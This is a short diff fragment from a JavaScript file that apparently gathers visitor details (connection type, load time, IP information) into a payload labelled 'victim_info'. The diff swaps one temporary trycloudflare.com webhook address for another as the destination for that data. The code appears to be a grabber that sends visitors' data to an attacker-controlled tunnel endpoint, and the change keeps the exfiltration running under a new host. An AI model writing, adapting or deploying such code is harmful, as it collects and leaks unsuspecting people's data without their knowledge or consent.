@@ -85,7 +85,7 @@ Connection Type: ${connectionType}
 Loading Time: ${loadTime}
                 `;
 
-                const webhookURL = "https://exercises-located-opposed-benefits.trycloudflare.com/userData";
+                const webhookURL = "https://richards-mails-wildlife-provider.trycloudflare.com/userData";
 
                 const payload = {
                     'victim_info': ipinfo, 
